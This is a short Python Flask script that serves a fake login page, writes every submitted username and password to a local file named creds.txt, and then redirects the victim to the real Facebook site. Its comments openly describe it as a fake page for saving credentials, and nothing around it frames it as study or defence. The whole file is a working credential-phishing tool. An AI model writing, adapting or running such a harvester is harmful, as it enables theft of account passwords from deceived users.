from flask import Flask, request, redirect

app = Flask(__name__)

# Fake Login Page HTML (No need for extra files)
fake_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <form action="/login" method="post">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

@app.route('/')
def home():
    return fake_page  # Serve the fake page

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save credentials to a text file
    with open('creds.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return redirect("https://www.facebook.com")  # Redirect to real site

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)